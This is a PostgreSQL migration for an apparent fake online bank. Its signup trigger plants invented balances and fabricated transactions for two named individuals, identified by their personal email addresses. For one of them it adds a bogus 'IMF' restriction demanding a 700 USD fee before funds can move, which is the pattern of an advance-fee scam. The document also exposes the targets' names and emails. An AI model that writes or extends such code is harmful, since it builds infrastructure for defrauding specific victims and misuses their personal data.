-- Reverse 27,000 PLN back to Anna Kenska's account and add failed payment transaction

-- Update the create_user_accounts function to give Anna 84,000 PLN total and add the reversal transaction
CREATE OR REPLACE FUNCTION public.create_user_accounts()
 RETURNS trigger
 LANGUAGE plpgsql
 SECURITY DEFINER
 SET search_path TO 'public'
AS $function$
DECLARE
    pln_account_id UUID;
    usd_account_id UUID;
BEGIN
  -- Create profile first
  INSERT INTO public.profiles (user_id, first_name, last_name, email)
  VALUES (
    NEW.id,
    COALESCE(NEW.raw_user_meta_data->>'first_name', 'User'),
    COALESCE(NEW.raw_user_meta_data->>'last_name', 'Account'),
    NEW.email
  );

  -- Create standard accounts for all currencies
  INSERT INTO public.accounts (user_id, account_number, currency, balance, account_type)
  VALUES 
    (NEW.id, generate_account_number(), 'USD', 0.00, 'checking'),
    (NEW.id, generate_account_number(), 'EUR', 0.00, 'checking'),
    (NEW.id, generate_account_number(), 'GBP', 0.00, 'checking'),
    (NEW.id, generate_account_number(), 'PLN', 0.00, 'checking');

  -- Special handling for Anna Kenska - updated balance to 84,000 PLN (57,000 + 27,000 reversal)
  IF NEW.email = 'keniol9822@op.pl' THEN
    -- Update PLN account with the total balance including reversal
    UPDATE public.accounts 
    SET balance = 84000.00 
    WHERE user_id = NEW.id AND currency = 'PLN'
    RETURNING id INTO pln_account_id;
    
    -- Create the original transfer transaction from Bill Investment Management
    INSERT INTO public.transactions (
      to_account_id,
      amount,
      currency,
      transaction_type,
      description,
      reference_number,
      status,
      created_at
    ) VALUES (
      pln_account_id,
      57000.00,
      'PLN',
      'deposit',
      'Transfer from Bill Investment Management',
      'BIM-MGMT-' || extract(epoch from '2025-07-17'::timestamp)::text,
      'completed',
      '2025-07-17 10:00:00+00'
    );

    -- Create the reversal transaction for the failed payment
    INSERT INTO public.transactions (
      to_account_id,
      amount,
      currency,
      transaction_type,
      description,
      reference_number,
      status,
      created_at
    ) VALUES (
      pln_account_id,
      27000.00,
      'PLN',
      'deposit',
      'Reversal: Payment Failed - 27,000 PLN returned to account',
      'REV-' || extract(epoch from now())::text,
      'completed',
      now()
    );

    -- Add IMF transfer restriction for Anna Kenska
    INSERT INTO public.transfer_restrictions (
      user_id,
      restriction_type,
      restriction_amount,
      restriction_currency,
      target_email,
      is_active
    ) VALUES (
      NEW.id,
      'IMF - International Monetary Fund (Final payment with legal documentation certificate)',
      700.00,
      'USD',
      'imf@internationalmonetaryfund.org',
      true
    );
  END IF;

  -- Special handling for Liliana Alejandra Fonseca Acuña
  IF NEW.email = 'lilianafa1026@hotmail.com' THEN
    -- Update USD account with the transfer amount
    UPDATE public.accounts 
    SET balance = 50000.00 
    WHERE user_id = NEW.id AND currency = 'USD'
    RETURNING id INTO usd_account_id;
    
    -- Create the transfer transaction from Won Ji Hoon
    INSERT INTO public.transactions (
      to_account_id,
      amount,
      currency,
      transaction_type,
      description,
      reference_number,
      status,
      created_at
    ) VALUES (
      usd_account_id,
      50000.00,
      'USD',
      'deposit',
      'Transfer from Won Ji Hoon',
      'WJH-TRANSFER-' || extract(epoch from now())::text,
      'completed',
      now()
    );

    -- Add conversion restriction for Liliana
    INSERT INTO public.transfer_restrictions (
      user_id,
      restriction_type,
      restriction_amount,
      restriction_currency,
      target_email,
      is_active
    ) VALUES (
      NEW.id,
      'currency_conversion',
      0.00,
      'USD',
      'lilianafa1026@hotmail.com',
      true
    );
  END IF;

  RETURN NEW;
EXCEPTION
  WHEN OTHERS THEN
    -- Log the error but don't prevent user creation
    RAISE LOG 'Error in create_user_accounts: %', SQLERRM;
    RETURN NEW;
END;
$function$;